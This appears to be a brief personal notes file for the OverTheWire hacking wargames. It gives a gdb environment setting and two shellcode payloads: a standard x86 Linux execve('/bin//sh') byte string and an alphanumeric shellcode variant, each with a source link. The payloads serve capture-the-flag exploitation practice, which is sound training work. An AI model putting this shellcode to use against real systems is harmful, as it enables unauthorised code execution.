# over-the-wire
hacking

# gdb settings
```
(gdb) set exec-wrapper env -u LINES -u COLUMNS
```

# shellcode
https://dhavalkapil.com/blogs/Shellcode-Injection/
```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
```

# alphanumeric shellcode
https://www.exploit-db.com/exploits/13424
```
LLLLXPY3E01E01u03u0fXh8eshXf5VJPfhbifhDefXf5AJfPDTYhKATYX5KATYPQTUX3H01H01X03X0YRX3E01E03U0Jfh2GfXf3E0f1E0f1U0fh88fX0E1f1E0f3E0fPTRX49HHHQfPfYRX2E00E0BRX0E02E02L0z0L0zYRX4j4aGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGG
```
(requires %ebp to be something real)
